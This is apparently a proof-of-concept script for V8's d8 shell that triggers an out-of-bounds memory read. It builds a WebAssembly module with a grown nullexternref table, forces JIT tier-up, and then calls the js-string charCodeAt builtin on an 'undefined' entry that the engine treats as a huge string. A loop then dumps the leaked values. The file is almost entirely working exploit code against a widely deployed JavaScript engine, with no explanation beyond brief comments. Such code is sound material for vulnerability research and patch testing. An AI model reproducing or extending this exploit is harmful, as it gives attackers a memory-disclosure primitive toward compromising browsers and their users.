

/// Flags:  --experimental-wasm-exnref

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");

///// wasm-module-builder.js END /////

let builder = new WasmModuleBuilder();
let kSig_i_ri = makeSig([kWasmExternRef, kWasmI32], [kWasmI32]);
let $charCodeAt = builder.addImport('wasm:js-string', 'charCodeAt', kSig_i_ri);
let $t = builder.addTable(kWasmNullExternRef, 0, 1).exportAs('table');

let $f = builder.addFunction('f', makeSig([kWasmI32, kWasmI32], [kWasmI32])).addBody([
  kExprLocalGet, 1,
  kExprIf, kWasmVoid,
    ...wasmI32Const(1337),
    kExprBr, 1,
  kExprEnd,

  ...wasmI32Const(0),
  kExprTableGet, $t.index,
  kExprLocalGet, 0,
  kExprCallFunction, $charCodeAt,
]).exportFunc();

let instance = builder.instantiate({}, {builtins: ['js-string']});
let {table, f, g} = instance.exports;

table.grow(1);
console.log(table.get(0));  // undefined???

// tier-up
for (let i = 0; i < 0x200000; i++) {
  f(0, 1);
}

// read characters oob - `undefined` considered as string of length 0x7ff80000
for (let i = 0; i < 0x10000; i++) {
  console.log(i.toString(16), f(i).toString(16));
}